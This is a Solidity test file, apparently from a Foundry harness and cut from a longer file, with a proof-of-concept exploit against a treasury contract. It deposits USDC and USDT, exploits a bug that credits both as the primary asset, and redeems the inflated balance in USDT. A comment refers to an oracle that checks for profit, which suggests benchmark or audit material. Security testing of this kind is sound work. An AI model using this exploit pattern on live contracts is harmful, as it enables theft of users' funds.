    address attacker = address(this);
    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ITreasury treasury = ITreasury(TARGET);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        uint256 amount = 10_000e6;

        deal(address(usdt), attacker, amount);
        deal(address(usdc), attacker, amount);

        // Reset approvals to 0 before setting a new allowance.
        usdt.approve(TARGET, 0);
        usdc.approve(TARGET, 0);

        // Set new approvals for the specific amount to be deposited.
        uint256 depositAmount = 1_000e6;
        usdt.approve(TARGET, depositAmount);
        usdc.approve(TARGET, depositAmount);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialAttackerUSDTBalance = usdt.balanceOf(attacker);

        // Deposit 1000 USDC and 1000 USDT
        uint256 depositAmount = 1_000e6;
        treasury.invest(address(usdc), depositAmount);
        treasury.invest(address(usdt), depositAmount);

        // Due to the bug, the contract thinks we have deposited 2000 units of the primary asset.
        uint256 inflatedBalance = treasury.balanceOf(attacker);

        // Redeem the inflated balance in USDT
        treasury.redeem(inflatedBalance);

        // The oracle requires the attacker's balance of the specified token (USDT) to increase.
        assertGt(usdt.balanceOf(attacker), initialAttackerUSDTBalance);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

